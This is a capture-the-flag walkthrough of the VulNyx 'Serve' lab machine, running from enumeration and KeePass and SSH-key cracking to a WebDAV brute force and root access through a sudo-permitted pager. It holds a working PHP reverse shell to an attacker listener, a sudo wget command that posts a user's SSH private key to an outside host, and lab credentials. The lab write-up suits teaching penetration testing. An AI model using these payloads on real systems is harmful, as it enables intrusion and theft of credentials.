# VulNyx - Serve

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.20
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-19 21:46 +07
Nmap scan report for 10.11.5.20
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9a:0c:75:5a:bb:bb:06:a2:9a:7d:be:91:ca:45:45:e4 (RSA)
|   256 07:7d:e7:0f:0b:5e:5a:90:e9:33:72:68:49:3b:f5:8c (ECDSA)
|_  256 6c:15:32:a7:42:e7:9f:da:63:66:7d:3a:be:fb:bf:14 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:50:20:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.02 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.20/ -w /usr/share/wordlists/dirb/common.txt -x bak,old,txt,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              bak,old,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.hta.old             (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta.zip             (Status: 403) [Size: 275]
/.hta.bak             (Status: 403) [Size: 275]
/.htaccess.old        (Status: 403) [Size: 275]
/.htaccess.bak        (Status: 403) [Size: 275]
/.htaccess.zip        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.zip        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.bak        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.old        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/javascript           (Status: 301) [Size: 313] [--> http://10.11.5.20/javascript/]
/notes.txt            (Status: 200) [Size: 173]
/secrets              (Status: 301) [Size: 310] [--> http://10.11.5.20/secrets/]
/server-status        (Status: 403) [Size: 275]
/webdav               (Status: 401) [Size: 457]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.20/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 313] [--> http://10.11.5.20/javascript/]
/secrets              (Status: 301) [Size: 310] [--> http://10.11.5.20/secrets/]
/webdav               (Status: 401) [Size: 457]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

![web-notes](/walkthroughs/vulnyx/easy_difficulty/03_serve/web-notes.png)

![webdav](/walkthroughs/vulnyx/easy_difficulty/03_serve/webdav.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -z list,db-kdbx "http://10.11.5.20/secrets/FUZZ.FUZ2Z"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.11.5.20/secrets/FUZZ.FUZ2Z
Total requests: 441118

=====================================================================
ID           Response   Lines    Word       Chars       Payload             
=====================================================================

000001696:   200        14 L     82 W       1973 Ch     "db - kdbx"  
```

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget http://10.11.5.20/secrets/db.kdbx            
--2026-05-20 09:19:56--  http://10.11.5.20/secrets/db.kdbx
Connecting to 10.11.5.20:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2078 (2.0K)
Saving to: ‘db.kdbx’

db.kdbx               100%[======================>]   2.03K  --.-KB/s    in 0s      

2026-05-20 09:19:56 (221 MB/s) - ‘db.kdbx’ saved [2078/2078]
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
config-err-2sVHH4
db.kdbx
...


┌──(dungcngo㉿kali)-[/tmp]
└─$ file db.kdbx                                                                  
db.kdbx: Keepass password database 2.x KDBX
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ keepass2john db.kdbx > kpass.txt


┌──(dungcngo㉿kali)-[/tmp]
└─$ cat kpass.txt 
db:$keepass$*2*60000*0*8cc5c72f222ddea9d2b6cf569817aeab3780b49a73cd3ff379e4c49618897951*b6d4442dabeb9233b1123d9c3b5887b8cdb4e18931b8b39a834319b6bed02242*b4d2010eac5ddc3afd47126f74759211*f38a908c1d0dbd3fa35be63946a3f4636169114cc01a66fc79f020f9267c1bd0*f9365972db868a767ac30a4455d2ae8bf6c2e7aefc46bac56ab56e2dfa3b9b5c
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt kpass.txt --fork=4 --rules 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Each node loaded 1/4 of wordfile to memory (about 33 MB/node)
Press 'q' or Ctrl-C to abort, almost any other key for status
dreams           (db)     
3 1g 0:00:00:09 DONE (2026-05-20 09:29) 0.1034g/s 16.95p/s 16.95c/s 16.95C/s dreams
4 0g 0:00:01:04 DONE (2026-05-20 09:29) 0g/s 30.26p/s 30.26c/s 30.26C/s mememe1
1 0g 0:00:01:06 DONE (2026-05-20 09:29) 0g/s 28.88p/s 28.88c/s 28.88C/s poophead
Waiting for 3 children to terminate
2 0g 0:00:01:06 DONE (2026-05-20 09:29) 0g/s 27.97p/s 27.97c/s 27.97C/s bingbing
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
![keepass login](/walkthroughs/vulnyx/easy_difficulty/03_serve/keepass-login.png)

![webdav login](/walkthroughs/vulnyx/easy_difficulty/03_serve/webdav-login.png)

This is user `admin`'s password of `webdav`: `w3bd4vXXX`. with XXX is `teo`'s employee number.

We create a wordlist consisting of all 9-character strings, starting with `w3bd4v` and ending with three digits from `000` to `999` by `crunch` command.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ crunch 9 9 -t w3bd4v%%% -o pass_teo.txt
Crunch will now generate the following amount of data: 10000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 

crunch: 100% completed generating output
```
We brute-force the `admin` user by `hydra`:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l admin -P pass_teo.txt -f 10.11.5.20 http-get /webdav -v -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 09:52:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
[DATA] attacking http-get://10.11.5.20:80/webdav
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-get] host: 10.11.5.20   login: admin   password: w3bd4v513
[STATUS] attack finished for 10.11.5.20 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 09:52:36
```
We have `admin`'s password is `w3bd4v513`.

![index of webdav](/walkthroughs/vulnyx/easy_difficulty/03_serve/webdav-indexof.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano reverse_shell.php
                                                                                                                                                                     ┌──(dungcngo㉿kali)-[/tmp]
└─$ cat reverse_shell.php                                                         
<?php
$sock = fsockopen("10.11.5.4", 4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>


┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -T reverse_shell.php http://10.11.5.20/webdav/ --digest -u admin:w3bd4v513 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/reverse_shell.php has been created.</p>
<hr />
<address>Apache/2.4.38 (Debian) Server at 10.11.5.20 Port 80</address>
</body></html>


┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s http://10.11.5.20/webdav/reverse_shell.php --digest -u admin:w3bd4v513 
```
#### Shell (www-data)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.20] 56812
/bin/sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
serve
$ bash -pi
bash: cannot set terminal process group (423): Inappropriate ioctl for device
bash: no job control in this shell
www-data@serve:/var/www/webdav$ 
```
```bash
www-data@serve:/var/www/webdav$ sudo -l
sudo -l
Matching Defaults entries for www-data on Serve:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Serve:
    (teo) NOPASSWD: /usr/bin/wget
```

We use `teo`'s user privileges, send `teo`'s SSH private key file (`id_rsa`) to an external server Kali (`10.11.5.4:443`) via HTTP POST protocol.
```bash
www-data@serve:/var/www/webdav$ sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 10.11.5.4:443         
<get --post-file=/home/teo/.ssh/id_rsa 10.11.5.4:443
--2026-05-19 19:06:40--  http://10.11.5.4:443/
Connecting to 10.11.5.4:443... connected.
HTTP request sent, awaiting response... 
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443  
listening on [any] 443 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.20] 54168
POST / HTTP/1.1
User-Agent: Wget/1.20.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.11.5.4:443
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1743

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,6D251FAD3AF600FF

pdRdBLM15/otHzHNnZAxKb/AmzRlkZiTSwi2T0GV5Gji3qnJFJCJUHycQPoS+Tmb
y08X/RQB+IosSfcavMjP8aqcBpYOmPNRqegh6B6ArNZAblAp4W+TDu0IktrAQgL1
F9uex4C/Qe/vaVPPe4/pp/ZT0BCBOSi7pA97IKGSR9QIUFym1dNHOADrB3fv4q2W
aN/pxKuypiu8AW2e97oboFJftZkyOqpfaWqrg5DBMN/49J1sHa3h+DLHCFyl5RCc
KYH+VHHPjrxoeZdP/7bu6tu4MK0Nce9aqSZ5/AKtzHR/RPlUXQjt3tHxFXhpzjwA
8MErPtPSWfr/Ixv0/5u6yOA8u1oUmDPTCR/ZgIwqiD5q3//m8IuoBTpkl4qDw2NI
DBCmB8X+CohLWzYcFLrVlV8sRLS7KvCc+d1ACfOwDE2By6ND/q6Apc+zvXq1Dp5H
fZUvjOlYIxU+EvhDvdVv0kOEbc4PSuGQueJ/9Fg6Q7+uTkYO+ZH0C3uNbyo6sICx
EXAni9JblJlSNt9yXAVW/4GkxLe6acz7tZQFINCsPP9Zu2fSAI+AlOOJVMh/2rkh
nZrgvhsluEgMk2BbaYHz95veOYUG9VyesWgLWqn/UXCXm1XcaZXH0oajya9Iz/fW
ggnf2o0i4Iu4pPx4yTRaMeX1afKILi+MAVr1uUqrqnM5KwJZCaFdllGAxSJfyk/y
QwfGIUz/Kslgff9TMIxxxzLCmpq8V1TdpzY0T3Fg3lr6+Ic3Z4HMLXfoo8d9UpgM
0jWyJnGyT3KFM7GTpuYMgStEuS+ZAl1yO5SKj7qBdfE5Xjj93IJ6PcJA3/FAlQBb
0lOSKRoF3i6qeUf9+PDfJqbDmE3SSMV0LHf6ZMSkcBkQu/QTyvNiME3zpO6UgQWl
HSVwYmfBH6dtbL6W3LFByoszPaVcvRCuaKLECVDrvdtNmP/YhVsSIyq8ZteVngmG
TFkXm57J4mC0TT7mddP9BIzPIs7FN05oeTzVyw5kxhoXHMJzo9FdU6e3rfVsJNNV
eqA8cM1Aeo+U9V90+omg8kYd/3gJEsui3JJoABzQlBJwMejx7pFD6X3Fy0v+C8Gj
x5yAigeJaZnUWDn2aGHKf4wBBFcOFiwPI6GPuGkvDfTvIoaYwacpHkvP5N2Ssg1r
FvzKoh9Wdk4D1yGolUd8wJNV904Ikz+jvIcrEp2b1SezE2hasgYBcEQ7Te6bZD+o
Ou6+YPyuAzvjeQlXtKRdUZifYw/aFbIdF2WEHqgYGuf/rD56xiu6v5vKL4oEW/62
t0Tc/d4sGOCtYxg5F3sTUFA5epdPFtvR0oYEXwGbM/vfJ0jIR27RFhZ7Su606j4p
px3dAcSKOEg74Y8ybIysaeX5Ni8yFc3JIA/efR7s5lno4Pi8r3q+uw1T2tgPgihI
XHh4hQZ9jiPxRrRwy5rQUd//+ZHP0Rdob0w80mCozFvWO7Uu4V0fBcLVQjRbDBBx
k2ltEwzDztVyQZxrN1HAQqWTA7oI4Ay+dYg/RZbFU0oaL5y4TD7bhXUhU6SWMPcJ
x8BDP7kZ6hQwqQ/eDXnS4wN8p0xzkrvybyTJDWpP2j570bOkUTE7MQ==
-----END RSA PRIVATE KEY-----
```
Use `ssh2john` and `john` to crack `id_rsa`'s passpharse file.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nano id_rsa
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh2john id_rsa > id_rsa.hash
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash --fork=4 --rules
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Each node loaded 1/4 of wordfile to memory (about 33 MB/node)
Press 'q' or Ctrl-C to abort, almost any other key for status
private          (id_rsa)     
1 1g 0:00:00:02 DONE (2026-05-20 10:45) 0.3717g/s 186.6p/s 186.6c/s 186.6C/s private
Waiting for 3 children to terminate
private          (id_rsa)     
2 1g 0:00:00:12 DONE (2026-05-20 10:45) 0.07704g/s 276338p/s 276338c/s 276338C/s private
private          (id_rsa)     
4 1g 0:00:00:13 DONE (2026-05-20 10:45) 0.07668g/s 275027p/s 275027c/s 275027C/s private
private          (id_rsa)     
3 1g 0:00:00:52 DONE (2026-05-20 10:45) 0.01909g/s 507443p/s 507443c/s 507443C/s private
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
#### Shell (teo)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 700 id_rsa

┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa teo@10.11.5.20
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
teo@serve:~$ id; hostname
uid=1000(teo) gid=1000(teo) grupos=1000(teo)
serve
```

### Privilege Escalation
#### Enumeration
```bash
teo@serve:~$ sudo -l
Matching Defaults entries for teo on Serve:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User teo may run the following commands on Serve:
    (root) NOPASSWD: /usr/local/bin/bro
```
This means that the user `teo` is allowed to run a tool called `bro` located at the path /usr/local/bin/bro` as `root` without having to enter a password.

```bash
teo@serve:~$ sudo /usr/local/bin/bro
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::NIL is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Data is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::TRUE is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::FALSE is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Fixnum is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Bignum is deprecated
Bro! Specify a command first!

        * For example try bro curl

        * Use bro help for more info
```

#### Abuse
```bash
teo@serve:~$ sudo /usr/local/bin/bro help
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::NIL is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Data is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::TRUE is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::FALSE is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Fixnum is deprecated
/var/lib/gems/2.5.0/gems/commander-4.1.5/lib/commander/user_interaction.rb:328: warning: constant ::Bignum is deprecated
  NAME:

    bro

  DESCRIPTION:

    Highly readable supplement to man pages.
    
    Shows simple, concise examples for commands.

  COMMANDS:
        
    ...no                Downvote an entry, bro         
    add                  Add an entry, bro              
    help                 Display global or [command] help documentation.        
    lookup               Lookup an entry, bro. Or just call bro [COMMAND]       
    no                   Downvote an entry, bro         
    thanks               Upvote an entry, bro   

  GLOBAL OPTIONS:
        
    -h, --help 
        Display help documentation
        
    -v, --version 
        Display version information
        
!/bin/bash
root@serve:/home/teo# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
serve
```

#### Flags
```bash
root@serve:/home/teo# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
981f4425d4ffcb3fb2fe145463b1d476
28bf16070abffab749a16bd11f635474
```

***You are welcome!***
